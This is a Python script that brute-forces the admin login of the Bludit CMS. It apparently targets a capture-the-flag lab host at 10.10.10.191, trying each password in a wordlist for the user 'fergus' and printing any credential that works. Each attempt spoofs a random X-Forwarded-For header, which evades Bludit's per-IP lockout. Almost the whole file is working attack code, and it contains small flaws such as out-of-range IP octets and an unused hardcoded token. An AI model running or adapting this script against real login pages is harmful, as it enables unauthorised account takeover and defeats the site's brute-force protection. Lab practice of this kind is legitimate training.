#! /usr/bin/python3

import requests
import re
import random

HOST = '10.10.10.191'       # CHANGE THIS
USER = "fergus"             # CHANGE THIS

# Proxy for debugging
PROXY = {'http': 'http://127.0.0.1:8080'}

def init_session():
    # Return CSRF token + Session (cookie)
    tokenCSRF = "ef20d04bb9e5983f7a054d7997c3db6340b7c78b"
    req = requests.get(f'http://{HOST}/admin/')
    csrf = re.search(r'type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-z0-9]*)"',req.text)
    csrf = csrf.group(1)
    cookie = req.cookies.get('BLUDIT-KEY')
    return csrf,cookie

def login(user,password):
    csrf,cookie = init_session()
    header = {'X-Forwarded-For': f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"}
    data = {'tokenCSRF':csrf,'username':user,'password':password,'save':''}
    cookie = {'BLUDIT-KEY': cookie}
    req = requests.post(f'http://{HOST}/admin/login', data=data, cookies=cookie, headers=header, allow_redirects=False)
    if req.status_code != 200:
        print(f'{USER}:{password}')
    elif "password incorrect" in req.text:
        return False
    elif "has benn blocked" in req.text:
        print(f'[+]\tBlocked')
        return False
    else:
        print(f'{USER}:{password}')
        return True

wl = open('wordlist',"r").readlines()       #CHANGE THIS path/to/wordlist
for line in wl:
    line = line.strip()
    login('fergus',line)
